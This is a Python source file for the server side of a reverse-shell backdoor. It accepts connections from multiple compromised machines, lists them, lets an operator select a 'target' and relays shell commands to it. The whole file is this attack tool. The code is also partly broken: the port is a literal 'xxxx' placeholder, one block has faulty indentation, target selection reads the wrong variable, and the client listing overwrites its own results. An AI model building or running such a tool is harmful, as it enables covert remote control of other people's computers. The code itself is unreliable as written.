import cmd
import socket
#to use system commands
import sys
#we have two threads one for connection and other one for sending the commands
import threading
import time

from queue import Queue

NUMBER_OF_THREADS=2
JOB_NUMBER=[1,2]
queue =Queue()
all_connections=[]
all_addresses=[]

#create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = xxxx #port number 
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error : " + str(msg))

#binding socket and listening
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port : "+str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error : " + str(msg) + "\n" + "Retrying...")
        bind_socket()

#Handling connections from multiple clients and saving to a list
#Closing previous connections when server.py file is restarted

def acceptingconnections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address=s.accept()
            s.setblocking(1) #prevent timeout

            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection has been istablished: " + address[0])

        except:
            print("Error accepting connections")

#2nd thread functions : -1 see all clients -2 select a client -3 send commands to the connected client
#CMD in windows, terminal in linux and mac are shells
#turtle> list
#0 Friend-A Port
#1 Friend-B Port
#2 Friend-C Port
#turtle> select 1
#x.x.x.x > dir    ///x.x.x.x is IP 

def start_turtle():
    while True:
        cmd = input('tutrle> ')
        if cmd=='list':
            list_connections()
        elif 'select' in cmd:
            conn=get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")

#Display all current active connections with the client

def list_connections():
    results=''

    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(''))
            conn.recv(201480)
        except:
           del all_connections[i]
            del all_addresses[i]
            continue
        results=str(i)+" "+str(all_addresses[i][0])+ " "+str(all_addresses[i][1])+"\n"

    print("---Clients---"+"\n"+results)

#selecting target
def get_target(conn):
    try:
        target=cmd.replace('select ','') #we need onliy target id
        target=int(target)
        conn=all_connections[target]
        print("You are now connected to :"+str(all_addresses[target][0]))
        print(str(all_addresses[target][0])+">", end="")
        return conn

        #192.168.0.4> connect to a client's shell
    except:
        print("Selection not valid")
        return None

#send commands to a client
def send_target_commands(conn):
    while True:
        try:
            cmd=input()
            if cmd=='quit':
                break
            if len(str.encode(cmd))>0:#the code that we are sending is not empty
                conn.send(str.encode(cmd))
                client_response= str(conn.recv(20480),"utf-8") # convert into string and her it is bigger because we want all the data back
                print(client_response, end="")# to let it give a new line for more commands
        except:
            print("Error sending commands")
            break

#create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t=threading.Thread(target=work)
        t.daemon=True #Tell the system to stop the thread when the program ends
        t.start()


#Do next job that is inside the queue(1- handle connections or 2- send commands)
def work():
    while True:
        x=queue.get()
        if x==1:
            create_socket()
            bind_socket()
            acceptingconnections()
        if x==2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()
